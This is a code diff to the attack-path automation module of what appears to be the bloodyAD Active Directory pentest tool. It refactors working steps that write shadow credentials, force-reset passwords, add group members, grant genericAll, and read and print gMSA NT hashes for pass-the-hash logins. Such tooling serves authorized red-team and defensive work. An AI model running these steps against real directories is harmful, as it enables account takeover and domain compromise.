@@ -2,7 +2,7 @@ from bloodyAD import ConnectionHandler
 from bloodyAD.cli_modules import add, set, remove, get
 from bloodyAD.exceptions import LOG
 from badldap.commons.exceptions import LDAPModifyException
-import logging, re
+import logging, re, copy
 # Constant for password changes
 PASSWORD_DEFAULT = "AutoBl00dy123!"
 
@@ -77,7 +77,7 @@ class Automation:
     async def _unfold(self):
         for rel in self.path:
             if not self.simulation:
-                LOG.info("")
+                print()
             typeID = rel["cost"]
             try:
                 await self.rel_types[typeID](rel)
@@ -99,7 +99,7 @@ class Automation:
                 await laundry["f"](self.conn, *laundry["args"])
         self.dirty_laundry = []
 
-    async def _switchUser(self, user, pwd):
+    async def _switchUser(self, user, pwd, dom=None):
         await self._washer()
         if self.simulation:
             print(f"\nAuthenticated as {user}:\n")
@@ -108,10 +108,11 @@ class Automation:
             await self.conn.closeLdap()
             
             # Create new args for the new user
-            import copy
             new_args = copy.copy(self.co_args)
             new_args.username = user
             new_args.password = pwd
+            if dom:
+                new_args.domain = dom
             
             # Clear old credentials to avoid mixing credential types
             new_args.certificate = None
@@ -156,7 +157,7 @@ class Automation:
                 await add_operation(self.conn, group_dn, member_sid)
                 ldap_co = await self.conn.getLdap()
                 # Reconnect to apply changes
-                await ldap_co.connect()
+                await ldap_co._con.connect()
                 self.dirty_laundry.append({"f": remove.groupMember, "args": [group_dn, member_sid]})
             except LDAPModifyException as e:
                 # Check if it's an entryAlreadyExists error
@@ -189,11 +190,12 @@ class Automation:
         """
         Try to use shadowCredentials first, fall back to forceChangePassword if not possible
         """
-        target = rel["end_node"]["name"]
         shadow_operation = add.shadowCredentials
         if self.simulation:
+            target = rel["end_node"]["name"]
             self._printOperation(shadow_operation.__name__, [target])
         else:
+            target = rel["end_node"]["samaccountname"]
             target_dn = rel["end_node"]["distinguishedname"]
                 
             # Try shadowCredentials
@@ -212,7 +214,7 @@ class Automation:
             # Pass NT hash in the format ":nt_hash" for NTLM authentication
             LOG.info(f"Switching to user: {target}")
             self.dirty_laundry.append({"f": remove.shadowCredentials, "args": [target_dn, key]})
-            await self._switchUser(target, pwd)
+            await self._switchUser(target, pwd, dom=rel["end_node"]["domain"])
             # except Exception as e:
             #     # If shadowCredentials fails, fall back to forceChangePassword
             #     LOG.warning(f"shadowCredentials failed: {e}, falling back to forceChangePassword")
@@ -228,14 +230,9 @@ class Automation:
         else:
             user_dn = rel["end_node"]["distinguishedname"]
             await pwd_operation(self.conn, user_dn, pwd)
-            ldap = await self.conn.getLdap()
-            user_entry = None
-            async for entry in ldap.bloodysearch(user_dn, attr=["sAMAccountName"]):
-                user_entry = entry
-                break
-            user = user_entry["sAMAccountName"]
+            user = rel["end_node"]["samaccountname"]
             LOG.info(f"switching to LDAP connection for user {user}")
-        await self._switchUser(user, pwd)
+        await self._switchUser(user, pwd, dom=rel["end_node"]["domain"])
 
     async def _genericAll(self, rel):
         add_operation = add.genericAll
@@ -247,7 +244,7 @@ class Automation:
             user = rel["start_node"]["distinguishedname"]
             target = rel["end_node"]["distinguishedname"]
             await add_operation(self.conn, target, user)
-        self.dirty_laundry.append({"f": remove.genericAll, "args": [target, user]})
+            self.dirty_laundry.append({"f": remove.genericAll, "args": [target, user]})
 
     async def _setOwner(self, rel):
         operation = set.owner
@@ -262,10 +259,11 @@ class Automation:
 
     async def _readGMSAPassword(self, rel):
         """Exploit ReadGMSAPassword edge to retrieve GMSA password"""
-        target = rel["end_node"]["name"]
-        if self.simulation:          
+        if self.simulation:    
+            target = rel["end_node"]["name"]      
             self._printOperation("readGMSAPassword", [target])
         else:
+            target = rel["end_node"]["samaccountname"]
             target_dn = rel["end_node"]["distinguishedname"]
             
             # Read msDS-ManagedPassword attribute from the GMSA account
@@ -277,23 +275,11 @@ class Automation:
                     break
                 
             if nthash:
-                print(f"From {target}, retrieved GMSA NT hash: {nthash}")
-                
-                # Get the sAMAccountName for the GMSA account
-                ldap = await self.conn.getLdap()
-                user_entry = None
-                async for entry in ldap.bloodysearch(target_dn, attr=["sAMAccountName"]):
-                    user_entry = entry
-                    break
-                
-                if user_entry:
-                    user = user_entry["sAMAccountName"]
-                    # Pass NT hash in the format ":nt_hash" for NTLM authentication
-                    pwd = ":"+nthash
-                    LOG.info(f"Switching to GMSA account: {user}")
-                    await self._switchUser(user, pwd)
-                else:
-                    LOG.warning("Could not retrieve sAMAccountName for GMSA account")
+                print(f"From {target}, retrieved GMSA NT hash: {nthash}")  
+                # Pass NT hash in the format ":nt_hash" for NTLM authentication
+                pwd = ":"+nthash
+                LOG.info(f"Switching to GMSA account: {target}")
+                await self._switchUser(target, pwd, dom=rel["end_node"]["domain"])
             else:
                 raise ValueError("Failed to retrieve GMSA password")
 
